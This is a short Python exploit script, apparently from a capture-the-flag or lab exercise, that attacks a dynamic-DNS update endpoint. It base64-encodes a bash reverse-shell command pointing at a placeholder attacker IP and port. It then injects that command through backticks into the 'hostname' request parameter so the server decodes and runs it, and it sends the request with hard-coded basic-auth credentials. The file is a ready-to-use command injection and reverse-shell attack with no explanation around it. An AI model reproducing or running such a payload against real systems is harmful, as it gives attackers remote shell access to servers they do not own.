
#!/usr/bin/python3

##
##
##

import os,sys,re
import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://yoyoyo.HAXXX/nic/update'
payload = b'bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
	'myip' : '<YOUR IP>',
	'hostname': '`echo "{}" | base64 -d | bash`"dynadns.no-ip.HAXXX'.format(final.decode()),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('xxxnkdlnasdf', 'lsdkfnalsdkfSDFnlsdfn'), params=params)
print (res.text)

##
##
###################
##
